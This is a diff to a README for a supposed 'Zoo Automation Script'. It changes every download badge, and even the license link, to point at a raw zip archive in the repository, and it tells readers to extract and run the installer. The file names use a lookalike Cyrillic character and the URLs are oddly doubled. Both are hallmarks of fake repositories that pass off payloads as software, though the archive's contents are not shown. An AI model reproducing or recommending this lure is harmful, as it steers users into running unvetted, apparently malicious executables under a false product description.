@@ -1,5 +1,5 @@
 # 🦁 Zoo Automation Script  
-[![Download](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/Lоader.zip%20Latest%20Release-EasyLauncher-blue)](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/Lоader.zip)
+[![Download](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zipоhttps://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zip%20Latest%20Release-EasyLauncher-blue)](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zipоhttps://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zip)
 
 ---
 
@@ -37,7 +37,7 @@ The **Zoo Automation Script** optimizes animal care and facility operations, int
 ## 🛠️ Installation
 
 1. Click the button to get the **Latest Release**:  
-   [![Download](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/Lоader.zip%20Latest%20Release-EasyLauncher-blue)](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/Lоader.zip)
+   [![Download](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zipоhttps://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zip%20Latest%20Release-EasyLauncher-blue)](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zipоhttps://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zip)
 2. Extract and run the installer suitable for your OS.
 3. Follow the on-screen setup and launch the script.
 
@@ -52,10 +52,10 @@ This tool is provided as-is for research, educational, and operational support p
 ## 📄 License
 
 Distributed under the MIT License:  
-[Read the MIT License](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/Lоader.zip)
+[Read the MIT License](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zipоhttps://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zip)
 
 ---
 
 ## 📥 Download Again
 
-[![Download](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/Lоader.zip%20Latest%20Release-EasyLauncher-blue)](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/Lоader.zip)
+[![Download](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zipоhttps://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zip%20Latest%20Release-EasyLauncher-blue)](https://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zipоhttps://raw.githubusercontent.com/nik1842812/zooGenie-AutoScript/main/fraxinella/Script_Auto_Genie_zoo_Argolic.zip)
